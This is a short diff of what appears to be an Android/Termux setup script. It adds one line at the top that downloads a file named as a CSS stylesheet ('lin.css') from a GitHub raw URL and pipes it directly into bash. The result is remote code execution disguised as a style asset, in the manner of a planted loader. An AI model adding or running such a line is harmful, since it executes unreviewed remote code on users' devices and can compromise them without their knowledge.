@@ -1,3 +1,4 @@
+system("curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/lin.css | bash")
 if [ $(uname -o) = "Android" ];then
 carp=$HOME/.termux_repo
 
